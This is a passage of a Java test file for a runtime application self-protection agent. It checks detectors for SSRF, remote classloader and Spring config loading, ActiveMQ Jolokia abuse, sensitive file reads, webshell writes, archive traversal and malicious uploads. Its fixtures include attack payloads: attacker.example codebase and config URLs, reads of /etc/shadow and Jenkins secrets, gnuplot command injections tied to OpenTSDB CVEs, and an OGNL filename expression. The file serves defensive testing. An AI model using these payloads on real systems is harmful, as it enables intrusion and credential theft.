    assertAlgorithm(result, "ssrf_userinput");
  }

  @Test
  void ignoresPublicCxfXopHttpAttachmentReference() {
    var result =
        NetworkDestinationDetector.detectXmlAttachmentReference(
            "cxf-aegis-xop", "https://example.com/public-image.png", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresUnknownXmlAttachmentMechanism() {
    var result =
        NetworkDestinationDetector.detectXmlAttachmentReference("mail-url-datasource", "file:///etc/hosts", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresBackgroundCxfXopAttachmentReference() {
    var result =
        NetworkDestinationDetector.detectXmlAttachmentReference(
            "cxf-aegis-xop", "file:///etc/hosts", RequestContext.empty());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresLocalClasspathJarResource() {
    var result =
        NetworkDestinationDetector.detectUrl(
            "jar:file:/usr/local/tomcat/lib/servlet-api.jar!/jakarta/servlet/LocalStrings.properties",
            request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresSpringBootNestedClasspathResource() {
    var result =
        NetworkDestinationDetector.detectUrl(
            "jar:nested:/app.jar/!BOOT-INF/lib/fastjson-1.2.83.jar!/com/alibaba/fastjson/parser/ParserConfig.class",
            request());

    assertTrue(result.isEmpty());
  }

  @Test
  void distinguishesArchiveConfigurationFromRequestSelection() {
    String archive = "https://reports.invalid/releases/weekly.jar";
    String entry = "jar:" + archive + "!/summary.txt";
    assertTrue(NetworkDestinationDetector.detectUrl(entry, request()).isEmpty());
    var configured = NetworkDestinationDetector.detectUrl(entry, request(), true).orElseThrow();
    assertTrue(configured.requiresExplicitRule());
    for (String selected : List.of(archive, entry)) {
      var input = request(Map.of("archive", List.of(selected)));
      assertTrue(NetworkDestinationDetector.detectUrl(entry, input).isEmpty());
      assertTrue(NetworkDestinationDetector.requestSuppliesHttpUrl(java.net.URI.create(archive), archive, "reports.invalid", input));
      String other = "https://reports.invalid/releases/other.jar";
      assertFalse(NetworkDestinationDetector.requestSuppliesHttpUrl(java.net.URI.create(other), other, "reports.invalid", input));
    }
    var json = new RequestContext("POST", "/reports", "", Map.of(), Map.of("content-type", "application/json"),
        "{\"archive\":\"" + entry + "\"}");
    assertTrue(NetworkDestinationDetector.requestSuppliesHttpUrl(java.net.URI.create(archive), archive, "reports.invalid", json));
    var broad = io.ohmyrasp.agent.policy.AgentPolicy.parse("{\"rules\":[{\"hook\":\"ssrf\",\"action\":\"block\"}]}");
    var explicit = io.ohmyrasp.agent.policy.AgentPolicy.parse("{\"rules\":[{\"algorithm\":\"ssrf_protocol\",\"action\":\"block\"}]}");
    assertTrue(broad.evaluate(configured, "").ignored());
    assertEquals("block", explicit.evaluate(configured, "").detection().action());
  }

  @Test
  void ignoresTomcatLibraryFileResource() {
    var result = NetworkDestinationDetector.detectUrl("file:/usr/local/tomcat/lib/servlet-api.jar", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void checksWhoSelectedALocalFileUrl() {
    String appFile = "file:/srv/orders/lib/renderer.jar";
    assertTrue(NetworkDestinationDetector.detectUrl(appFile, request()).isEmpty());
    assertAlgorithm(NetworkDestinationDetector.detectUrl(appFile, request(Map.of("source", List.of("file:///srv/orders/lib/")))),
        "ssrf_protocol");
    assertAlgorithm(NetworkDestinationDetector.detectUrl("file:/usr/local/tomcat/lib/servlet-api.jar",
        request(Map.of("source", List.of("/usr/local/tomcat/lib/servlet-api.jar")))), "ssrf_protocol");
    assertAlgorithm(NetworkDestinationDetector.detectUrl("file://host.example.invalid/share/readme", request()), "ssrf_protocol");
    assertAlgorithm(NetworkDestinationDetector.detectUrl("file:/etc/shadow", request()), "ssrf_protocol");
  }

  @Test
  void detectsRemoteUrlClassLoaderCodebase() {
    var result =
        RemoteResourceDetector.detectClassLoaderUrl(
            "http://attacker.example/evil.jar",
            "URLClassLoader",
            request(Map.of("codebase", List.of("http://attacker.example/evil.jar"))));

    assertAlgorithm(result, "classloader_remote");
  }

  @Test
  void detectsJarWrappedRemoteClassLoaderCodebase() {
    var result =
        RemoteResourceDetector.detectClassLoaderUrl(
            "jar:http://attacker.example/evil.jar!/payload/",
            "URLClassLoader",
            request());

    assertAlgorithm(result, "classloader_remote");
  }

  @Test
  void detectsRmiClassLoaderCodebase() {
    var result =
        RemoteResourceDetector.detectClassLoaderUrl(
            "ldap://attacker.example/Exploit",
            "RMIClassLoader",
            request());

    assertAlgorithm(result, "classloader_remote");
  }

  @Test
  void ignoresLocalUrlClassLoaderCodebase() {
    var result =
        RemoteResourceDetector.detectClassLoaderUrl(
            "file:/usr/local/tomcat/webapps/ROOT/WEB-INF/lib/app.jar",
            "URLClassLoader",
            request());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsRemoteSpringConfigLocation() {
    var result =
        RemoteResourceDetector.detectSpringConfigLocation(
            "http://attacker.example/poc.xml",
            "SpringConfig",
            request(Map.of("config", List.of("http://attacker.example/poc.xml"))));

    assertAlgorithm(result, "spring_remote_config");
  }

  @Test
  void detectsXbeanRemoteSpringConfigLocation() {
    var result =
        RemoteResourceDetector.detectSpringConfigLocation(
            "xbean:http://attacker.example/poc.xml",
            "SpringConfig",
            request());

    assertAlgorithm(result, "spring_remote_config");
  }

  @Test
  void detectsJarWrappedRemoteSpringConfigLocation() {
    var result =
        RemoteResourceDetector.detectSpringConfigLocation(
            "jar:http://attacker.example/poc.jar!/beans.xml",
            "SpringConfig",
            request());

    assertAlgorithm(result, "spring_remote_config");
  }

  @Test
  void ignoresLocalSpringConfigLocation() {
    assertTrue(
        RemoteResourceDetector
            .detectSpringConfigLocation("classpath:applicationContext.xml", "SpringConfig", request())
            .isEmpty());
    assertTrue(
        RemoteResourceDetector
            .detectSpringConfigLocation("file:/opt/app/applicationContext.xml", "SpringConfig", request())
            .isEmpty());
  }

  @Test
  void detectsRequestTimeJmxRemoteConfigInvocation() {
    var result =
        RemoteResourceDetector.detectJmxMBeanInvoke(
            "org.apache.activemq:type=Broker,brokerName=localhost",
            "addNetworkConnector",
            List.of("static:(vm://evil?brokerConfig=xbean:http://attacker.example/poc.xml)"),
            request());

    assertAlgorithm(result, "jmx_remote_config");
  }

  @Test
  void detectsActiveMqJolokiaBrokerConfigInvocation() {
    String body =
        "{\"type\":\"exec\","
            + "\"mbean\":\"org.apache.activemq:type=Broker,brokerName=localhost\","
            + "\"operation\":\"addNetworkConnector(java.lang.String)\","
            + "\"arguments\":[\"static:(vm://evil?brokerConfig=xbean:http://attacker.example/poc.xml)\"]}";
    RequestContext request =
        new RequestContext(
            "POST",
            "/api/jolokia/",
            "",
            Map.of(),
            Map.of("content-type", "application/json", "authorization", "Basic YWRtaW46YWRtaW4="),
            body);

    var result =
        RemoteResourceDetector.detectJmxMBeanInvoke(
            "org.apache.activemq:type=Broker,brokerName=localhost",
            "addNetworkConnector(java.lang.String)",
            List.of("static:(vm://evil?brokerConfig=xbean:http://attacker.example/poc.xml)"),
            request);

    assertAlgorithm(result, "jmx_remote_config");
    assertEquals(100, result.orElseThrow().confidence());
    assertEquals("true", result.orElseThrow().details().get("requestControlled"));
    assertEquals("/api/jolokia/", result.orElseThrow().request().uri());
  }

  @Test
  void correlatesManagedArgumentsWithAnObservedWrite() {
    String selected = "/reports/weekly.jsp";
    for (String argument : List.of(selected, "<report destination=\"" + selected + "\"/>")) {
      io.ohmyrasp.agent.jmx.JmxWriteScope.enter();
      try {
        var values = List.of(argument);
        io.ohmyrasp.agent.jmx.JmxWriteScope.select("reports:type=Writer", "publish", values);
        assertTrue(RemoteResourceDetector.detectJmxMBeanInvoke("reports:type=Writer", "publish", values, request()).isEmpty());
        var scope = io.ohmyrasp.agent.jmx.JmxWriteScope.current();
        assertTrue(HostFileMutationDetector.detectJmxFileWrite("/reports/other.jsp", scope, "channel_open", request()).isEmpty());
        var detection = HostFileMutationDetector.detectJmxFileWrite(selected, scope, "channel_open", request());
        assertAlgorithm(detection, "jmx_file_write");
        assertEquals("selected_write_open", detection.get().details().get("decision_basis"));
      } finally {
        io.ohmyrasp.agent.jmx.JmxWriteScope.exit();
      }
    }
  }

  @Test
  void ignoresReadOnlyJmxRemoteUrlArgument() {
    var result =
        RemoteResourceDetector.detectJmxMBeanInvoke(
            "example:type=Info",
            "getStatus",
            List.of("http://example.com/status"),
            request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresJmxBenignFileWriteTarget() {
    var result =
        RemoteResourceDetector.detectJmxMBeanInvoke(
            "example:type=Logger",
            "setLogFile",
            List.of("/var/log/app/current.log"),
            request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresBackgroundJmxRemoteConfigInvocation() {
    var result =
        RemoteResourceDetector.detectJmxMBeanInvoke(
            "org.apache.activemq:type=Broker,brokerName=localhost",
            "addNetworkConnector",
            List.of("static:(vm://evil?brokerConfig=xbean:http://attacker.example/poc.xml)"),
            RequestContext.empty());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsArgs4jArgumentFileExpansionForJenkinsMasterKey() {
    var result =
        FileAccessDetector.detectArgumentFileExpansion(
            "args4j",
            List.of("help", "@/var/jenkins_home/secrets/master.key"),
            request());

    assertAlgorithm(result, "readFile_argument_expansion");
    assertEquals("args4j", result.orElseThrow().details().get("parser"));
  }

  @Test
  void detectsArgs4jArgumentFileExpansionForProcEnviron() {
    var result =
        FileAccessDetector.detectArgumentFileExpansion(
            "args4j",
            List.of("@/proc/self/environ"),
            request(Map.of("arg", List.of("@/proc/self/environ"))));

    assertAlgorithm(result, "readFile_argument_expansion");
    assertEquals("/proc/self/environ", result.orElseThrow().details().get("path"));
  }

  @Test
  void detectsArgs4jArgumentFileExpansionForJenkinsConnectNodePasswd() {
    var result =
        FileAccessDetector.detectArgumentFileExpansion(
            "args4j",
            List.of("connect-node", "@/etc/passwd"),
            request(Map.of("arg", List.of("connect-node", "@/etc/passwd"))));

    assertAlgorithm(result, "readFile_argument_expansion");
    assertEquals("@/etc/passwd", result.orElseThrow().details().get("argument"));
    assertEquals("/etc/passwd", result.orElseThrow().details().get("path"));
  }

  @Test
  void ignoresRelativeArgs4jArgumentFileExpansion() {
    var result =
        FileAccessDetector.detectArgumentFileExpansion(
            "args4j", List.of("@relative/options.txt"), request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresUnknownArgumentFileExpansionParser() {
    var result =
        FileAccessDetector.detectArgumentFileExpansion(
            "picocli", List.of("@/var/jenkins_home/secrets/master.key"), request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresBackgroundArgumentFileExpansion() {
    var result =
        FileAccessDetector.detectArgumentFileExpansion(
            "args4j",
            List.of("@/var/jenkins_home/secrets/master.key"),
            RequestContext.empty());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsSsrfCommonCallbackDomain() {
    var result = NetworkDestinationDetector.detectUrl("http://probe.dnslog.cn/callback", request());

    assertAlgorithm(result, "ssrf_common");
  }

  @Test
  void detectsSsrfObfuscatedHost() {
    var result = NetworkDestinationDetector.detectUrl("http://2130706433/", request());

    assertAlgorithm(result, "ssrf_obfuscate");
  }

  @Test
  void detectsDnslogHost() {
    var result = NetworkDestinationDetector.detectDns("abc.dnslog.cn", request());

    assertTrue(result.isPresent());
    assertEquals("dns_blacklist", result.orElseThrow().algorithm());
  }

  @Test
  void detectsSensitiveFileRead() {
    var result = FileAccessDetector.detectFileRead("/etc/passwd", request(), false);

    assertTrue(result.isPresent());
    assertEquals("readFile_unwanted", result.orElseThrow().algorithm());
  }

  @Test
  void detectsHttpFileReadFromUserInput() {
    var result =
        FileAccessDetector.detectFileRead(
            "http://127.0.0.1/internal",
            request(Map.of("file", List.of("http://127.0.0.1/internal"))),
            false);

    assertAlgorithm(result, "readFile_userinput_http");
  }

  @Test
  void detectsUnwantedFileReadProtocolFromUserInput() {
    var result =
        FileAccessDetector.detectFileRead(
            "file:///etc/passwd", request(Map.of("file", List.of("file:///etc/passwd"))), false);

    assertAlgorithm(result, "readFile_userinput_unwanted");
  }

  @Test
  void detectsMetabaseGeojsonFileReadProtocolFromUserInput() {
    var result =
        FileAccessDetector.detectFileRead(
            "file:////etc/passwd", request(Map.of("url", List.of("file:////etc/passwd"))), false);

    assertAlgorithm(result, "readFile_userinput_unwanted");
  }

  @Test
  void detectsFileReadOutsideWebroot() {
    assertTrue(FileAccessDetector.detectFileRead("/etc/hosts", request(), false).isEmpty());
    var result = FileAccessDetector.detectFileRead("/etc/hosts", request(), false, true);

    assertAlgorithm(result, "readFile_outsideWebroot");
  }

  @Test
  void detectsXxeFileReadFromParserStackHint() {
    var result = FileAccessDetector.detectFileRead("/etc/passwd", request(), true);

    assertTrue(result.isPresent());
    assertEquals("xxe_file", result.orElseThrow().algorithm());
  }

  @Test
  void ignoresSimpleParameterNameSubstringInLibraryFileRead() {
    var result =
        FileAccessDetector.detectFileRead(
            "/usr/local/tomcat/webapps/ROOT/WEB-INF/lib/spring-expression-7.0.7.jar",
            request(Map.of("expr", List.of("T(java.lang.Runtime).getRuntime().exec('id')"))),
            false);

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsScriptFileWrite() {
    var result = HostFileMutationDetector.detectFileWrite("/usr/local/tomcat/webapps/ROOT/shell.jsp", request());

    assertTrue(result.isPresent());
    assertEquals("writeFile_script", result.orElseThrow().algorithm());
  }

  @Test
  void distinguishesDirectReflectiveWriteFromOrdinaryBackgroundWrite() {
    String path = "/srv/app/views/order.jsp";
    var ordinary = List.of("java.io.FileOutputStream", "app.Renderer", "java.lang.reflect.Method");
    assertTrue(HostFileMutationDetector.detectFileWrite(path, RequestContext.empty(), ordinary).isEmpty());
    var direct = List.of("java.io.FileOutputStream", "java.io.FileOutputStream", "java.lang.reflect.Constructor");
    assertAlgorithm(HostFileMutationDetector.detectFileWrite(path, RequestContext.empty(), direct), "writeFile_reflect");
  }

  @Test
  void appliesFilePolicyToTheDefaultWindowsStreamAndRequiresASelectorForNamedStreams() {
    var ordinary = new io.ohmyrasp.agent.file.WindowsDataStream("weekly.csv", "");
    var script = new io.ohmyrasp.agent.file.WindowsDataStream("report.jsp", "");
    var metadata = new io.ohmyrasp.agent.file.WindowsDataStream("weekly.csv", "author");
    assertTrue(HostFileMutationDetector.detectWindowsStreamWrite(ordinary, request(), List.of(), true).isEmpty());
    assertAlgorithm(HostFileMutationDetector.detectWindowsStreamWrite(script, request(), List.of(), false), "writeFile_script");
    assertTrue(HostFileMutationDetector.detectWindowsStreamWrite(metadata, request(), List.of(), false).isEmpty());
    var selected = HostFileMutationDetector.detectWindowsStreamWrite(metadata, request(), List.of(), true).orElseThrow();
    assertEquals("writeFile_NTFS", selected.algorithm());
    assertEquals("author", selected.details().get("stream"));
    assertTrue(selected.requiresExplicitRule());
    assertTrue(FileUploadDetector.detectFileUpload("weekly.csv::$DATA", request()).isEmpty());
  }

  @Test
  void detectsReflectiveJspFileWrite() {
    var result =
        HostFileMutationDetector.detectFileWrite(
            "/usr/local/tomcat/webapps/ROOT/shell.jsp",
            request(),
            List.of("java.lang.reflect.Method", "shell.Backdoor"));

    assertAlgorithm(result, "writeFile_reflect");
  }

  @Test
  void detectsOpenTsdbCve202035476GeneratedGnuplotYrangeScriptWrite() {
    String payload = "[0:system('touch /tmp/success')]";
    String content = "set yrange " + payload + "\nplot '-' using 1:2";

    var result =
        HostFileMutationDetector.detectGeneratedScriptFileWrite(
            "/tmp/opentsdb-plot.gnuplot",
            content,
            request(Map.of("yrange", List.of(payload))));

    assertAlgorithm(result, "writeFile_generated_script");
  }

  @Test
  void detectsOpenTsdbCve202325826GeneratedGnuplotKeyScriptWrite() {
    String payload = ";system \"touch /tmp/poc\" \"";
    String content = "set key " + payload + "\nplot '-' using 1:2";

    var result =
        HostFileMutationDetector.detectGeneratedScriptFileWrite(
            "/tmp/tsd-graph.gp",
            content,
            request(Map.of("key", List.of(payload))));

    assertAlgorithm(result, "writeFile_generated_script");
  }

  @Test
  void distinguishesProgramOperationsFromTemporaryReportData() {
    String op = "system(\"printf weekly\")";
    var ctx = request(Map.of("label", List.of(op)));
    assertTrue(HostFileMutationDetector.detectGeneratedScriptFileWrite("/tmp/report", "# " + op, ctx).isEmpty());
    assertTrue(HostFileMutationDetector.detectGeneratedScriptFileWrite("/tmp/report", "title = '" + op + "'", ctx).isEmpty());
    assertAlgorithm(HostFileMutationDetector.detectGeneratedScriptFileWrite("/tmp/report", "value = " + op, ctx), "writeFile_generated_script");
    assertTrue(HostFileMutationDetector.detectGeneratedScriptFileWrite("/tmp/report", "label = 'North'\nvalue = " + op,
        request(Map.of("label", List.of("North")))).isEmpty());
    assertAlgorithm(HostFileMutationDetector.detectGeneratedScriptFileWrite("/tmp/report", "value = " + op,
        request(Map.of("value", List.of("printf weekly")))), "writeFile_generated_script");
  }

  @Test
  void ignoresBenignGeneratedGnuplotScriptWrite() {
    var result =
        HostFileMutationDetector.detectGeneratedScriptFileWrite(
            "/tmp/opentsdb-plot.gnuplot",
            "set yrange [0:42]\nplot '-' using 1:2",
            request(Map.of("yrange", List.of("[0:42]"))));

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsRocketMqCve202337582UnsafeConfigPersistenceFileWrite() {
    var result =
        HostFileMutationDetector.detectFileWrite(
            "/tmp/success",
            RequestContext.empty(),
            List.of(
                "org.apache.rocketmq.remoting.Configuration",
                "org.apache.rocketmq.common.MixAll"));

    assertAlgorithm(result, "writeFile_config_path");
    assertEquals(
        "org.apache.rocketmq.remoting.Configuration",
        result.orElseThrow().details().get("persistence"));
  }

  @Test
  void ignoresNormalConfigPersistenceFileWrite() {
    var result =
        HostFileMutationDetector.detectFileWrite(
            "/root/namesrv/namesrv.properties",
            RequestContext.empty(),
            List.of(
                "org.apache.rocketmq.remoting.Configuration",
                "org.apache.rocketmq.common.MixAll"));

    assertTrue(result.isEmpty());
  }

  @Test
  void distinguishesDeletePathControlFromAReportIdentifier() {
    String absolute = "/srv/docs/report-10.txt";
    assertTrue(HostFileMutationDetector.detectFileDelete(absolute, request(Map.of("week", List.of("10")))).isEmpty());
    assertTrue(HostFileMutationDetector.detectFileDelete(absolute, request(Map.of("file", List.of("report-10.txt")))).isEmpty());
    assertTrue(HostFileMutationDetector.detectFileDelete(absolute, request(Map.of("file", List.of(absolute)))).isEmpty());
    String protectedEntry = "/srv/docs/WEB-INF/report.xml";
    assertTrue(HostFileMutationDetector.detectFileDelete(protectedEntry, request(Map.of("file", List.of(protectedEntry)))).isEmpty());
    assertTrue(HostFileMutationDetector.detectFileDelete("/srv/docs/../note.txt",
        request(Map.of("file", List.of("../note.txt")))).isEmpty());
  }

  @Test
  void detectsArchiveTraversalExtraction() {
    var result =
        HostFileMutationDetector.detectArchiveExtraction(
            "../escaped/archive.txt", "/tmp/ohmyrasp/root/../escaped/archive.txt", request());

    assertAlgorithm(result, "archive_traversal");
  }

  @Test
  void detectsAbsoluteArchiveEntryExtraction() {
    var result = HostFileMutationDetector.detectArchiveExtraction("/tmp/evil.txt", "/tmp/evil.txt", request());

    assertAlgorithm(result, "archive_traversal");
  }

  @Test
  void ignoresNormalArchiveEntryExtraction() {
    var result =
        HostFileMutationDetector.detectArchiveExtraction(
            "docs/readme.txt", "/tmp/ohmyrasp/root/docs/readme.txt", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void requiresAnEscapingMemberAndCorrespondingWritePath() {
    for (String[] paths : new String[][] {
        {"drafts/../report.txt", "/out/drafts/../report.txt"},
        {"../out/report.txt", "/tmp/out/../out/report.txt"},
        {"../report.txt", "/out/drafts/../report.txt.bak"},
        {"../notes/report.txt", "/out/drafts/../report.txt"},
        {"/notes/report.txt", "/out/notes/report.txt"},
        {" ../report.txt", "/out/ ../report.txt"}
    }) {
      assertTrue(HostFileMutationDetector.detectArchiveExtraction(paths[0], paths[1], request()).isEmpty());
    }
    assertAlgorithm(HostFileMutationDetector.detectArchiveExtraction("..\\report.txt",
        "/out/../report.txt", request()), "archive_traversal");
    assertAlgorithm(HostFileMutationDetector.detectArchiveExtraction("drafts/../../report.txt",
        "/out/drafts/../../report.txt", request()), "archive_traversal");
  }

  @Test
  void ignoresSanitizedArchiveTraversalEntry() {
    var result =
        HostFileMutationDetector.detectArchiveExtraction(
            "../escaped/archive.txt", "/tmp/ohmyrasp/root/safe/archive.txt", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsDirectoryUserInput() {
    var result = FileAccessDetector.detectDirectoryList("/etc", request(Map.of("path", List.of("/etc"))));

    assertTrue(result.isPresent());
    assertEquals("directory_userinput", result.orElseThrow().algorithm());
  }

  @Test
  void separatesTomcatDeploymentScanFromApplicationDirectoryListing() {
    var scan = List.of("java.io.File", "org.apache.catalina.webresources.DirResourceSet",
        "org.apache.catalina.startup.ContextConfig", "java.lang.reflect.Method");
    assertTrue(FileAccessDetector.detectDirectoryList("/app/WEB-INF/classes", RequestContext.empty(), scan).isEmpty());
    assertTrue(FileAccessDetector.detectDirectoryList("/root", RequestContext.empty(), scan).isEmpty());
    var app = List.of("java.io.File", "example.Initializer",
        "org.apache.catalina.startup.ContextConfig", "java.lang.reflect.Method");
    assertTrue(FileAccessDetector.detectDirectoryList("/data", RequestContext.empty(), app).isEmpty());
    var reflective = List.of("java.io.File", "java.lang.reflect.Method", "example.Initializer");
    assertTrue(FileAccessDetector.detectDirectoryList("/data", RequestContext.empty(), reflective).isEmpty());
  }

  @Test
  void fixedDirectoryLocationAndReflectionRequireExplicitRules() {
    var stack = List.of("java.lang.reflect.Method");
    assertTrue(FileAccessDetector.detectDirectoryList("/root", request(), stack).isEmpty());
    var candidates = FileAccessDetector.directoryListings("/root", request(), null, false, false, false,
        algorithm -> true, () -> stack);
    assertEquals(List.of("directory_unwanted", "directory_reflect"), candidates.stream().map(Detection::algorithm).toList());
    assertTrue(candidates.stream().allMatch(Detection::requiresExplicitRule));
  }

  @Test
  void detectsIncludeUserInput() {
    var result =
        FileAccessDetector.detectInclude(
            "/etc/passwd", "/etc/passwd", "include", request(Map.of("file", List.of("/etc/passwd"))));

    assertAlgorithm(result, "include_userinput");
  }

  @Test
  void detectsIncludeProtocol() {
    var result = FileAccessDetector.detectInclude("jar://file:/tmp/a.jar!/x", "", "include", request());

    assertAlgorithm(result, "include_protocol");
  }

  @Test
  void detectsForgedServletIncludeAttributeForProtectedResource() {
    var result =
        FileAccessDetector.detectServletIncludeAttributes(
            Map.of("javax.servlet.include.servlet_path", "/WEB-INF/web.xml"),
            requestUri("/"),
            List.of("org.apache.coyote.ajp.AjpProcessor"));

    assertAlgorithm(result, "request_forged_include_attribute");
    assertEquals("protected-resource", result.orElseThrow().details().get("targetType"));
    assertEquals("WEB-INF", result.orElseThrow().details().get("resource"));
    assertEquals(
        "servlet-include-attribute", result.orElseThrow().details().get("source"));
  }

  @Test
  void detectsTomcatGhostcatAjpIncludeAttributes() {
    var result =
        FileAccessDetector.detectServletIncludeAttributes(
            Map.of(
                "javax.servlet.include.request_uri",
                "/",
                "javax.servlet.include.path_info",
                "WEB-INF/web.xml",
                "javax.servlet.include.servlet_path",
                "/"),
            requestUri("/asdf"),
            List.of("org.apache.coyote.ajp.AjpProcessor"));

    assertAlgorithm(result, "request_forged_include_attribute");
    assertEquals("protected-resource", result.orElseThrow().details().get("targetType"));
    assertEquals("WEB-INF", result.orElseThrow().details().get("resource"));
    assertEquals("/asdf", result.orElseThrow().details().get("uri"));
  }

  @Test
  void detectsForgedServletIncludeAttributeForServerSideScript() {
    var result =
        FileAccessDetector.detectServletIncludeAttributes(
            Map.of("jakarta.servlet.include.path_info", "/uploads/shell.jsp"),
            requestUri("/"),
            List.of("org.apache.coyote.ajp.AjpProcessor"));

    assertAlgorithm(result, "request_forged_include_attribute");
    assertEquals("server-side-script", result.orElseThrow().details().get("targetType"));
  }

  @Test
  void ignoresLegitimateRequestDispatcherIncludeStack() {
    var result =
        FileAccessDetector.detectServletIncludeAttributes(
            Map.of("javax.servlet.include.servlet_path", "/WEB-INF/jsp/view.jsp"),
            requestUri("/page"),
            List.of("org.apache.catalina.core.ApplicationDispatcher", "com.example.View"));

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresSafeServletIncludeAttributeTarget() {
    var result =
        FileAccessDetector.detectServletIncludeAttributes(
            Map.of("javax.servlet.include.servlet_path", "/assets/logo.png"),
            requestUri("/"),
            List.of("org.apache.coyote.ajp.AjpProcessor"));

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsMultipartScriptUpload() {
    var result = FileUploadDetector.detectFileUpload("shell.jsp", request());

    assertAlgorithm(result, "fileUpload_multipart_script");
  }

  @Test
  void detectsWebLogicWsUtcJspUpload() {
    RequestContext request =
        new RequestContext(
            "POST",
            "/ws_utc/resources/setting/keystore",
            "",
            Map.of(),
            Map.of("content-type", "multipart/form-data; boundary=ohmyrasp"));

    var result = FileUploadDetector.detectFileUpload("shell.jsp", request);

    assertAlgorithm(result, "fileUpload_multipart_script");
    assertEquals("/ws_utc/resources/setting/keystore", result.orElseThrow().request().uri());
    assertEquals("shell.jsp", result.orElseThrow().details().get("filename"));
  }

  @Test
  void detectsMultipartUploadPathTraversal() {
    var result = FileUploadDetector.detectFileUpload("../../../../../../tmp/success", request());

    assertAlgorithm(result, "fileUpload_path_traversal");
  }

  @Test
  void detectsMultipartOgnlFilenameExpression() {
    var filename =
        "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']"
            + ".addHeader('X-Test',233*233)}\u0000b";

    var result = FileUploadDetector.detectFileUpload(filename, request());

    assertAlgorithm(result, "fileUpload_multipart_expression");
    assertEquals("ognl", result.orElseThrow().details().get("engine"));
    assertEquals(String.valueOf(filename.length()), result.orElseThrow().details().get("filenameLength"));
    assertFalse(result.orElseThrow().details().containsKey("filename"));
  }

  @Test
  void detectsEncodedMultipartUploadPathTraversal() {
    var result = FileUploadDetector.detectFileUpload("..%2f..%2f..%2fvar%2flog%2fapp.txt", request());

    assertAlgorithm(result, "fileUpload_path_traversal");
  }

  @Test
  void ignoresMultipartUploadSubdirectoryFilename() {
    var result = FileUploadDetector.detectFileUpload("reports/summary.txt", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresBenignExpressionLikeMultipartFilename() {
    var result = FileUploadDetector.detectFileUpload("report-%{yyyy}.txt", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsMultipartHtmlUpload() {
    var result = FileUploadDetector.detectFileUpload("phish.html", request());

    assertAlgorithm(result, "fileUpload_multipart_html");
  }

  @Test
  void detectsMultipartExecutableUpload() {
    var result = FileUploadDetector.detectFileUpload("dropper.exe", request());

    assertAlgorithm(result, "fileUpload_multipart_exe");
  }

  @Test
  void collectsPluginUploadCandidateForManagedPolicy() {
    var result = FileUploadDetector.detectFileUpload("Evil.jar", requestUri("/plugin/add"),
            ArchiveUploadPolicy.Decision.UNSPECIFIED, true);

    assertAlgorithm(result, "fileUpload_java_archive");
  }

  @Test
  void collectsJarUploadCandidateForManagedPolicy() {
    var result = FileUploadDetector.detectFileUpload("Exploit.jar", requestUri("/jars/upload"),
            ArchiveUploadPolicy.Decision.UNSPECIFIED, true);

    assertAlgorithm(result, "fileUpload_java_archive");
  }

  @Test
  void collectsJarParameterCandidateForManagedPolicy() {
    var request =
        new RequestContext(
            "POST", "/upload", "", Map.of("jarfile", List.of("selected")), Map.of());
    var result = FileUploadDetector.detectFileUpload("Exploit.jar", request, ArchiveUploadPolicy.Decision.UNSPECIFIED, true);

    assertAlgorithm(result, "fileUpload_java_archive");
  }

  @Test
  void archiveFilenameAloneDoesNotEstablishAuthorization() {
    var request = requestUri("/plugin/add");
    assertTrue(FileUploadDetector.detectFileUpload("release.jar", request).isEmpty());
    assertTrue(FileUploadDetector.detectFileUpload("release.jar", request, ArchiveUploadPolicy.Decision.ALLOWED, false).isEmpty());
    var denied = FileUploadDetector.detectFileUpload("release.jar", request, ArchiveUploadPolicy.Decision.ROLE_DENIED, false);
    assertAlgorithm(denied, "fileUpload_java_archive");
    assertEquals("required_role_denied", denied.orElseThrow().details().get("decision_basis"));
  }

  @Test
  void ignoresJavaArchiveRepositoryUpload() {
    var result = FileUploadDetector.detectFileUpload("library.jar", requestUri("/service/rest/v1/components"));

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresJavaArchiveUploadOnUnrelatedForm() {
    var result = FileUploadDetector.detectFileUpload("library.jar", requestUri("/profile/avatar"));

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsWebdavUpload() {
    var result = FileUploadDetector.detectWebdavUpload("avatar.jpg", "shell.jsp", "MOVE", request());

    assertAlgorithm(result, "fileUpload_webdav");
    assertEquals("server-side-script", result.orElseThrow().details().get("destinationType"));
  }

  @Test
  void detectsWebdavUploadToUnsafeFilesystemDestination() {
    var result =
        FileUploadDetector.detectWebdavUpload(
            "/fileserver/1.txt", "file:///etc/cron.d/root", "MOVE", request());

    assertAlgorithm(result, "fileUpload_webdav");
    assertEquals("unsafe-filesystem-path", result.orElseThrow().details().get("destinationType"));
    assertEquals("/etc/cron.d/root", result.orElseThrow().details().get("destinationPath"));
  }

  @Test
  void detectsActiveMqFileserverMoveToWebshell() {
    var result =
        FileUploadDetector.detectWebdavUpload(
            "/fileserver/2.txt", "file:///opt/activemq/webapps/api/s.jsp", "MOVE", request());

    assertAlgorithm(result, "fileUpload_webdav");
    assertEquals("server-side-script", result.orElseThrow().details().get("destinationType"));
    assertEquals("/fileserver/2.txt", result.orElseThrow().details().get("source"));
  }

  @Test
  void ignoresBenignWebdavUploadMove() {
    var result =
        FileUploadDetector.detectWebdavUpload(
            "/fileserver/avatar.jpg", "/fileserver/avatar-renamed.jpg", "MOVE", request());

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresWebdavUploadDestinationForReadOnlyMethod() {
    var result =
        FileUploadDetector.detectWebdavUpload(
